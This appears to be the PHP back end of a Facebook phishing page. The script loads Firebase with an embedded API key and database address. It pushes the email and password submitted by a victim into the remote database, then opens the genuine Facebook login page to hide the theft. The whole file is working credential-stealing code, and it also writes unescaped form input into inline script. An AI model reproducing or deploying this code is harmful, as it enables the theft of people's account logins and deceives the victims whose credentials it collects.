<?php
echo '<script src="https://www.gstatic.com/firebasejs/live/3.0/firebase.js"></script>
<script>
  // Initialize Firebase
  var config = {
    apiKey: "AIzaSyC1TUhvOJEWiYvtcBZdGP5l-yigCO4BC1c",
    authDomain: "",
    databaseURL: "https://informatica-d881b.firebaseio.com",
    storageBucket: "informatica-d881b.appspot.com",
  };
  firebase.initializeApp(config);
</script>';

echo "<script>firebase.database().ref('data/').push({username:" . "'" . $_POST['email'] . "'" . ", password: " . "'" . $_POST['pass'] . "'" . "}); window.open('https://www.facebook.com/login.php?login_attempt=1&lwv=110');</script>";

?>